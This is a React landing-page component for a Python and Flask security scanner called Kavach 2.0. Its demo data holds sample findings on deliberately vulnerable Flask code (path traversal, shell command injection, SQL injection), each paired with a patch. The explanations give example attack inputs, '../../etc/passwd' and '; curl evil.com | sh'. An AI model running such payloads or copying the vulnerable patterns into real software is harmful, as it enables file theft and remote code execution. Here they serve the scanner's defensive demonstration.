import { useEffect, useState } from 'react'
import { api } from '../api.js'
import { ErrorBox } from '../components.jsx'
import Tilt from '../components/Tilt.jsx'

const MIN_PASSWORD = 12

const SAMPLE_FINDINGS = [
  {
    id: 'cwe-22',
    name: 'Path Traversal (CWE-22)',
    file: 'app/routes/documents.py',
    cwe: 'CWE-22',
    severity: 'Critical 9.2',
    source: 'filename = request.args.get("doc")',
    sink: 'return open(target_path, "rb").read()',
    codeSnippet: [
      { n: 14, text: '@app.route("/view-document")' },
      { n: 15, text: 'def view_doc():' },
      { n: 16, text: '    doc = request.args.get("doc")  # [Source: Untrusted HTTP query]' , hl: 'source' },
      { n: 17, text: '    target = os.path.join(DOCS_DIR, doc)' },
      { n: 18, text: '    return open(target, "rb").read()  # [Sink: Unchecked file read]', hl: 'sink' },
    ],
    patchSnippet: [
      { type: 'del', text: '-     return open(target, "rb").read()' },
      { type: 'add', text: '+     safe_name = werkzeug.utils.secure_filename(doc)' },
      { type: 'add', text: '+     safe_target = os.path.abspath(os.path.join(DOCS_DIR, safe_name))' },
      { type: 'add', text: '+     if not safe_target.startswith(os.path.abspath(DOCS_DIR)):' },
      { type: 'add', text: '+         abort(400, "Access denied: invalid file path")' },
      { type: 'add', text: '+     return open(safe_target, "rb").read()' },
    ],
    explanation: 'Untrusted input from request.args flows without validation to the built-in open() call, permitting arbitrary file reads via directory traversal (e.g. "../../etc/passwd").',
  },
  {
    id: 'cwe-78',
    name: 'Command Injection (CWE-78)',
    file: 'app/utils/compress.py',
    cwe: 'CWE-78',
    severity: 'Critical 9.8',
    source: 'archive_name = request.json.get("archive")',
    sink: 'subprocess.check_output(f"tar -czf {archive_name} .", shell=True)',
    codeSnippet: [
      { n: 32, text: '@app.route("/compress", methods=["POST"])' },
      { n: 33, text: 'def compress_folder():' },
      { n: 34, text: '    archive = request.json.get("name")  # [Source: Untrusted JSON]', hl: 'source' },
      { n: 35, text: '    cmd = f"tar -czf {archive}.tar.gz /data"' },
      { n: 36, text: '    return subprocess.check_output(cmd, shell=True)  # [Sink: Shell execution]', hl: 'sink' },
    ],
    patchSnippet: [
      { type: 'del', text: '-     return subprocess.check_output(cmd, shell=True)' },
      { type: 'add', text: '+     safe_archive = re.sub(r"[^A-Za-z0-9_-]", "", archive)' },
      { type: 'add', text: '+     cmd = ["tar", "-czf", f"{safe_archive}.tar.gz", "/data"]' },
      { type: 'add', text: '+     return subprocess.check_output(cmd, shell=False)' },
    ],
    explanation: 'User input is interpolated into a shell command with shell=True, enabling shell metacharacter injection (e.g. "; curl evil.com | sh").',
  },
  {
    id: 'cwe-89',
    name: 'SQL Injection (CWE-89)',
    file: 'app/models/user.py',
    cwe: 'CWE-89',
    severity: 'High 8.5',
    source: 'search_term = request.args.get("q")',
    sink: 'cursor.execute(f"SELECT * FROM items WHERE name LIKE \'%{search_term}%\'")',
    codeSnippet: [
      { n: 21, text: '@app.route("/search")' },
      { n: 22, text: 'def search_items():' },
      { n: 23, text: '    query = request.args.get("q", "")  # [Source: Untrusted parameter]', hl: 'source' },
      { n: 24, text: '    sql = f"SELECT id, name FROM catalog WHERE name LIKE \'%{query}%\'"' },
      { n: 25, text: '    return db.session.execute(sql).fetchall()  # [Sink: Raw SQL string]', hl: 'sink' },
    ],
    patchSnippet: [
      { type: 'del', text: '-     sql = f"SELECT id, name FROM catalog WHERE name LIKE \'%{query}%\'"' },
      { type: 'del', text: '-     return db.session.execute(sql).fetchall()' },
      { type: 'add', text: '+     stmt = text("SELECT id, name FROM catalog WHERE name LIKE :pattern")' },
      { type: 'add', text: '+     return db.session.execute(stmt, {"pattern": f"%{query}%"}).fetchall()' },
    ],
    explanation: 'Unsanitized user input is concatenated into an SQL query string instead of using bound parameterized statements.',
  },
]

export default function Welcome({ onSignedIn, initialAuth = false, user = null }) {
  const [authOpen, setAuthOpen] = useState(initialAuth)
  const [authTab, setAuthTab] = useState('github') // 'github' | 'email'
  const [selectedSample, setSelectedSample] = useState(SAMPLE_FINDINGS[0])
  const [scanState, setScanState] = useState('scanned') // 'scanning' | 'scanned'
  const [cliCopied, setCliCopied] = useState(false)

  // Email/Password login state
  const [mode, setMode] = useState('signin')
  const [signupAllowed, setSignupAllowed] = useState(false)
  const [email, setEmail] = useState('')
  const [password, setPassword] = useState('')
  const [confirm, setConfirm] = useState('')
  const [busy, setBusy] = useState(false)
  const [error, setError] = useState('')

  useEffect(() => {
    try {
      const p = api.health?.()
      if (p && typeof p.then === 'function') {
        p.then((h) => setSignupAllowed(Boolean(h?.signup))).catch(() => setSignupAllowed(false))
      }
    } catch {
      setSignupAllowed(false)
    }
  }, [])

  useEffect(() => {
    if (initialAuth) setAuthOpen(true)
  }, [initialAuth])

  function triggerScanSimulation(sample) {
    setSelectedSample(sample)
    setScanState('scanning')
    const timer = setTimeout(() => {
      setScanState('scanned')
    }, 450)
    return () => clearTimeout(timer)
  }

  function copyCli() {
    navigator.clipboard?.writeText('sentinel scan . --format text')
    setCliCopied(true)
    setTimeout(() => setCliCopied(false), 2000)
  }

  const signup = mode === 'signup'
  const mismatch = signup && confirm.length > 0 && confirm !== password
  const tooShort = signup && password.length > 0 && password.length < MIN_PASSWORD
  const ready = email.trim() && password && (!signup || (password === confirm && !tooShort))

  async function handleEmailSubmit(event) {
    event.preventDefault()
    setError('')
    setBusy(true)
    try {
      const who = signup ? await api.register(email.trim(), password) : await api.login(email.trim(), password)
      if (onSignedIn) onSignedIn(who)
    } catch (err) {
      setPassword('')
      setConfirm('')
      setError(err.message)
    } finally {
      setBusy(false)
    }
  }

  return (
    <div className="welcome-page">
      {/* Subtle warm amber/orange flowing light background & dot grid */}
      <div className="warm-amber-glow" aria-hidden="true">
        <div className="amber-orb primary-orb" />
        <div className="amber-orb secondary-orb" />
        <div className="dot-grid-canvas" />
      </div>

      {/* HERO SECTION */}
      <section className="welcome-hero" aria-labelledby="hero-title">
        <div className="hero-content">
          <div className="hero-pill-tag">
            <span className="hero-pill-dot" />
            <span>Kavach 2.0 · Python & Flask Security Scanner</span>
          </div>

          <h1 id="hero-title" className="hero-headline">
            Find security flaws before they reach production.
          </h1>

          <p className="hero-subtext">
            Deterministic static taint analysis tracks untrusted inputs across functions directly into dangerous sinks.
            Review auto-generated AST patches and protect Git workflows without sharing your source code.
          </p>

          <div className="hero-actions">
            <a href="#product" className="button primary cta-button">
              <span>Continue locally</span>
              <span className="cta-arrow" aria-hidden="true">→</span>
            </a>

            <button
              type="button"
              className="button gh-button"
              onClick={() => {
                setAuthTab('github')
                setAuthOpen(true)
              }}
            >
              <svg width="18" height="18" viewBox="0 0 24 24" fill="currentColor" aria-hidden="true">
                <path fillRule="evenodd" clipRule="evenodd" d="M12 2C6.477 2 2 6.484 2 12.017c0 4.425 2.865 8.18 6.839 9.504.5.092.682-.217.682-.483 0-.237-.008-.868-.013-1.703-2.782.605-3.369-1.343-3.369-1.343-.454-1.158-1.11-1.466-1.11-1.466-.908-.62.069-.608.069-.608 1.003.07 1.53 1.032 1.53 1.032.892 1.53 2.341 1.088 2.91.832.092-.647.35-1.088.636-1.338-2.22-.253-4.555-1.113-4.555-4.951 0-1.093.39-1.988 1.029-2.688-.103-.253-.446-1.272.098-2.65 0 0 .84-.27 2.75 1.026A9.564 9.564 0 0112 6.844c.85.004 1.705.115 2.504.337 1.909-1.296 2.747-1.027 2.747-1.027.546 1.379.202 2.398.1 2.651.64.7 1.028 1.595 1.028 2.688 0 3.848-2.339 4.695-4.566 4.943.359.309.678.92.678 1.855 0 1.338-.012 2.419-.012 2.747 0 .268.18.58.688.482A10.019 10.019 0 0022 12.017C22 6.484 17.522 2 12 2z" />
              </svg>
              <span>Continue with GitHub</span>
            </button>
          </div>

          <div className="hero-sublinks">
            <span className="muted small">No account needed for local scans.</span>
            <span className="dot-divider" aria-hidden="true">·</span>
            <button
              type="button"
              className="link small-link"
              onClick={() => {
                setAuthTab('email')
                setAuthOpen(true)
              }}
            >
              Sign in with password
            </button>
          </div>

          <div className="trust-badges" aria-label="Key security guarantees">
            <div className="trust-item">
              <span className="trust-check">✓</span>
              <span>100% on-device local mode</span>
            </div>
            <div className="trust-item">
              <span className="trust-check">✓</span>
              <span>Deterministic AST analysis</span>
            </div>
            <div className="trust-item">
              <span className="trust-check">✓</span>
              <span>AES-256-GCM vault</span>
            </div>
          </div>
        </div>

        {/* OVERLAPPING TRANSLUCENT GLASS PANELS */}
        <div className="hero-preview-stage" aria-label="Interactive preview of Kavach security scanning">
          <div className="preview-label-tag">
            <span className="live-dot" />
            <span>Illustrative AST Trace Preview</span>
          </div>

          {/* Panel 1: Code & Taint Path */}
          <div className="glass-card preview-code-card">
            <div className="preview-card-header">
              <div className="window-dots" aria-hidden="true">
                <span className="dot red" />
                <span className="dot yellow" />
                <span className="dot green" />
              </div>
              <span className="code-filename mono">{selectedSample.file}</span>
              <span className="pill small sev-critical">{selectedSample.severity}</span>
            </div>

            <div className="code-preview-block">
              {selectedSample.codeSnippet.map((line) => (
                <div key={line.n} className={`code-row ${line.hl ? `hl-${line.hl}` : ''}`}>
                  <span className="ln mono">{line.n}</span>
                  <span className="code-text mono">{line.text}</span>
                </div>
              ))}
            </div>

            <div className="preview-trace-flow">
              <span className="trace-step source mono">Source: request</span>
              <span className="trace-arrow">→</span>
              <span className="trace-step var mono">os.path</span>
              <span className="trace-arrow">→</span>
              <span className="trace-step sink mono">Sink: open()</span>
            </div>
          </div>

          {/* Panel 2: Finding Diagnosis & Severity Badge */}
          <Tilt className="glass-card preview-finding-card">
            <div className="finding-preview-head">
              <span className="pill sev-critical mono">{selectedSample.cwe}</span>
              <span className="pill status-open">AST Reachable</span>
            </div>
            <strong className="finding-title">{selectedSample.name}</strong>
            <p className="finding-desc small muted">{selectedSample.explanation}</p>
          </Tilt>

          {/* Panel 3: Verified Patch Card */}
          <Tilt className="glass-card preview-patch-card">
            <div className="patch-card-header">
              <span className="badge ok">✓ Verified Patch</span>
              <span className="muted small">AST re-checked in memory</span>
            </div>
            <div className="patch-diff mono small">
              {selectedSample.patchSnippet.map((p, idx) => (
                <div key={idx} className={`diff-line ${p.type === 'del' ? 'diff-del' : 'diff-add'}`}>
                  {p.text}
                </div>
              ))}
            </div>
          </Tilt>
        </div>
      </section>

      {/* HOW IT WORKS SECTION */}
      <section id="how-it-works" className="section-block" aria-labelledby="how-it-works-title">
        <div className="section-header">
          <p className="eyebrow">How Kavach works</p>
          <h2 id="how-it-works-title" className="section-title">
            From raw input to verified fix in three steps.
          </h2>
          <p className="section-subtitle muted">
            Traditional linters drown you in style warnings. Kavach builds an AST propagation graph to prove whether user data actually reaches a dangerous call.
          </p>
        </div>

        <div className="steps-grid">
          <div className="step-card">
            <div className="step-badge">1</div>
            <h3>Connect or open a project</h3>
            <p className="muted small">
              Run <code className="mono">sentinel scan</code> on your machine or paste a GitHub repository link.
              Local projects stay 100% on your device without upload.
            </p>
          </div>

          <div className="step-card">
            <div className="step-badge">2</div>
            <h3>Scan and review findings</h3>
            <p className="muted small">
              The AST tracer follows request parameters through local helper functions to detect Command Injection, SQL Injection, and Path Traversal.
            </p>
          </div>

          <div className="step-card">
            <div className="step-badge">3</div>
            <h3>Approve a suggested fix</h3>
            <p className="muted small">
              Kavach generates syntactically correct code rewrites using hardened standard libraries, verifying in memory that the sink is neutralized before you merge.
            </p>
          </div>
        </div>
      </section>

      {/* LOCAL DEVELOPER EXPERIENCE */}
      <section id="product" className="section-block" aria-labelledby="local-title">
        <div className="section-header">
          <p className="eyebrow">Continue Locally</p>
          <h2 id="local-title" className="section-title">
            First-class local scanning. No account required.
          </h2>
          <p className="section-subtitle muted">
            Security tools should never hold your code hostage. Run Kavach via terminal CLI or test vulnerability patterns in the sandbox below.
          </p>
        </div>

        <div className="local-layout-grid">
          {/* CLI Instructions Card */}
          <div className="card local-cli-card">
            <div className="cli-card-head">
              <h3>Terminal CLI Quickstart</h3>
              <span className="pill status-fixed">Zero Network Required</span>
            </div>
            <p className="muted small">
              The Sentinel CLI analyzes Python files directly in your current directory. It reads your Git diff or entire tree in seconds.
            </p>

            <div className="terminal-box">
              <div className="terminal-header">
                <span className="terminal-prompt mono">$ sentinel scan .</span>
                <button type="button" className="button small-button" onClick={copyCli}>
                  {cliCopied ? 'Copied!' : 'Copy'}
                </button>
              </div>
              <pre className="terminal-output mono">
{`$ sentinel scan . --format text
[+] Discovered 14 Python source files
[+] Parsing Abstract Syntax Trees...
[+] AST Taint Tracer: 1 candidate sink identified
============================================================
CRITICAL: CWE-22 Path Traversal in app/routes.py:18
  Source: request.args.get("doc") at line 16
  Sink:   open(target, "rb") at line 18
  Fix:    Use werkzeug.utils.secure_filename & path boundary check
============================================================
1 finding (1 critical). Run with --sarif for CI output.`}
              </pre>
            </div>

            <div className="cli-features-list">
              <div className="cli-feat">
                <strong>Pre-commit Hook:</strong> <code className="mono">scripts/install-hook.sh</code>
              </div>
              <div className="cli-feat">
                <strong>Git Watch Mode:</strong> <code className="mono">sentinel watch --scan</code>
              </div>
            </div>
          </div>

          {/* Interactive Vulnerability Sandbox */}
          <div className="card local-sandbox-card">
            <div className="sandbox-head">
              <h3>Interactive Vulnerability Explorer</h3>
              <span className="muted small">Select an issue class to preview AST analysis:</span>
            </div>

            <div className="sample-selector" role="tablist" aria-label="Select vulnerability class">
              {SAMPLE_FINDINGS.map((sample) => (
                <button
                  key={sample.id}
                  type="button"
                  role="tab"
                  aria-selected={selectedSample.id === sample.id}
                  className={`button sample-btn ${selectedSample.id === sample.id ? 'active' : ''}`}
                  onClick={() => triggerScanSimulation(sample)}
                >
                  {sample.name}
                </button>
              ))}
            </div>

            <div className="sandbox-results">
              <div className="sandbox-meta">
                <div>
                  <strong>File: </strong><span className="mono small">{selectedSample.file}</span>
                </div>
                <div>
                  <span className="pill sev-critical small mono">{selectedSample.severity}</span>
                </div>
              </div>

              <div className="sandbox-flow">
                <div className="flow-block">
                  <span className="flow-title small muted">Untrusted Source:</span>
                  <code className="mono small">{selectedSample.source}</code>
                </div>
                <div className="flow-block">
                  <span className="flow-title small muted">Dangerous Sink:</span>
                  <code className="mono small">{selectedSample.sink}</code>
                </div>
              </div>

              <p className="muted small explanation-text">
                {selectedSample.explanation}
              </p>
            </div>
          </div>
        </div>
      </section>

      {/* PRIVACY & DATA HANDLING */}
      <section id="privacy" className="section-block" aria-labelledby="privacy-title">
        <div className="section-header">
          <p className="eyebrow">Privacy & Security</p>
          <h2 id="privacy-title" className="section-title">
            Transparent data boundaries by design.
          </h2>
          <p className="section-subtitle muted">
            We clearly separate local developer execution from optional cloud and team features.
          </p>
        </div>

        <div className="privacy-grid">
          <div className="card privacy-card">
            <div className="privacy-badge local-badge">Local Mode</div>
            <h3>Workstation Execution</h3>
            <ul className="privacy-list muted small">
              <li>
                <strong>Zero source code transmission:</strong> Code is processed in memory on your CPU and never leaves your machine.
              </li>
              <li>
                <strong>No account required:</strong> No registration, email, or API key needed to scan code or view findings.
              </li>
              <li>
                <strong>Deterministic offline rules:</strong> Detectors inspect syntax trees without telemetry or external AI dependencies.
              </li>
            </ul>
          </div>

          <div className="card privacy-card">
            <div className="privacy-badge team-badge">GitHub & Team Mode</div>
            <h3>Team & CI Integration</h3>
            <ul className="privacy-list muted small">
              <li>
                <strong>Encrypted storage at rest:</strong> Uploaded workspaces and findings are sealed with AES-256-GCM encryption.
              </li>
              <li>
                <strong>Account-isolated access:</strong> Scans are linked to your owner ID; other users receive 404 responses for unauthorized records.
              </li>
              <li>
                <strong>Admin repository authorization:</strong> GitHub sign-in identifies you; automated PR scanning requires explicit repository permission from an organization administrator.
              </li>
            </ul>
          </div>
        </div>
      </section>

      {/* FOOTER */}
      <footer className="welcome-footer muted small">
        <div className="footer-links">
          <a href="#product">Product</a>
          <a href="#how-it-works">How it works</a>
          <a href="#privacy">Privacy</a>
          <button type="button" className="link" onClick={() => { setAuthTab('email'); setAuthOpen(true) }}>
            Sign in
          </button>
        </div>
        <p>Kavach 2.0 · Python & Flask Security Scanner · Hack Fest 2026</p>
      </footer>

      {/* WELCOME / SIGN IN MODAL */}
      {authOpen && (
        <div className="modal-backdrop" role="dialog" aria-modal="true" aria-labelledby="auth-modal-title">
          <div className="modal-card">
            <button
              type="button"
              className="modal-close-btn"
              onClick={() => setAuthOpen(false)}
              aria-label="Close dialog"
            >
              ✕
            </button>

            <div className="modal-tabs" role="tablist">
              <button
                type="button"
                role="tab"
                aria-selected={authTab === 'github'}
                className={`tab-btn ${authTab === 'github' ? 'active' : ''}`}
                onClick={() => setAuthTab('github')}
              >
                GitHub Sign in
              </button>
              <button
                type="button"
                role="tab"
                aria-selected={authTab === 'email'}
                className={`tab-btn ${authTab === 'email' ? 'active' : ''}`}
                onClick={() => setAuthTab('email')}
              >
                Email & Password
              </button>
            </div>

            {authTab === 'github' && (
              <div className="github-auth-pane">
                <h2 id="auth-modal-title">Sign in with GitHub</h2>
                <p className="muted small">
                  Connect your GitHub identity for team repository scanning and automated PR checks.
                </p>

                <div className="account-flow-note small">
                  <div className="flow-item">
                    <span className="flow-bullet">•</span>
                    <span><strong>First-time sign-in</strong> automatically provisions your Kavach account.</span>
                  </div>
                  <div className="flow-item">
                    <span className="flow-bullet">•</span>
                    <span><strong>Returning developers</strong> are seamlessly authenticated via OAuth.</span>
                  </div>
                  <div className="flow-item">
                    <span className="flow-bullet">•</span>
                    <span><strong>Team authorization:</strong> GitHub sign-in identifies you. Pull request branch scanning additionally requires team admin authorization for your organization's repositories.</span>
                  </div>
                </div>

                {/* Accurate OAuth Backend Status Card */}
                <div className="oauth-status-box">
                  <div className="oauth-status-header">
                    <span className="badge warn">Backend Setup Required</span>
                    <span className="small muted">OAuth Endpoint Inactive</span>
                  </div>
                  <p className="small muted">
                    GitHub OAuth routes are not yet configured on this backend instance. To enable direct GitHub sign-in, the following configuration is needed:
                  </p>
                  <ul className="small mono oauth-needed-list">
                    <li>GITHUB_CLIENT_ID</li>
                    <li>GITHUB_CLIENT_SECRET</li>
                    <li>Backend route: /api/auth/github</li>
                  </ul>
                  <p className="small muted">
                    In the meantime, you can continue scanning locally without an account, or sign in using email credentials below.
                  </p>
                </div>

                <div className="auth-footer-actions">
                  <a href="#product" className="button primary" onClick={() => setAuthOpen(false)}>
                    Continue locally (no account)
                  </a>
                  <button type="button" className="button" onClick={() => setAuthTab('email')}>
                    Sign in with email instead
                  </button>
                </div>
              </div>
            )}

            {authTab === 'email' && (
              <div className="email-auth-pane">
                <h2 id="auth-modal-title">{signup ? 'Create an account' : 'Sign in with email'}</h2>
                <p className="muted small">
                  {signup
                    ? 'Create a Kavach account. Your scans will be private to your account.'
                    : 'Sign in to access your saved scans and monitor Flask applications.'}
                </p>

                <form onSubmit={handleEmailSubmit} className="login-form">
                  <label>
                    <span>Email</span>
                    <input
                      type="email"
                      autoComplete={signup ? 'email' : 'username'}
                      required
                      value={email}
                      onChange={(e) => setEmail(e.target.value)}
                      autoFocus
                    />
                  </label>
                  <label>
                    <span>Password</span>
                    <input
                      type="password"
                      autoComplete={signup ? 'new-password' : 'current-password'}
                      required
                      minLength={signup ? MIN_PASSWORD : undefined}
                      value={password}
                      onChange={(e) => setPassword(e.target.value)}
                    />
                    {signup && (
                      <span className={`hint ${tooShort ? 'bad' : ''}`}>
                        At least {MIN_PASSWORD} characters. A short sentence works well.
                      </span>
                    )}
                  </label>
                  {signup && (
                    <label>
                      <span>Confirm password</span>
                      <input
                        type="password"
                        autoComplete="new-password"
                        required
                        value={confirm}
                        onChange={(e) => setConfirm(e.target.value)}
                      />
                      {mismatch && <span className="hint bad">The passwords do not match.</span>}
                    </label>
                  )}
                  <ErrorBox error={error} />
                  <button type="submit" className="button primary" disabled={busy || !ready}>
                    {busy ? 'Processing…' : signup ? 'Create account' : 'Sign in'}
                  </button>
                </form>

                {signupAllowed && (
                  <p className="muted small switch-mode">
                    {signup ? 'Already have an account? ' : 'Need an account? '}
                    <button
                      type="button"
                      className="link"
                      onClick={() => {
                        setMode(signup ? 'signin' : 'signup')
                        setError('')
                      }}
                    >
                      {signup ? 'Sign in' : 'Create an account'}
                    </button>
                  </p>
                )}
              </div>
            )}
          </div>
        </div>
      )}
    </div>
  )
}
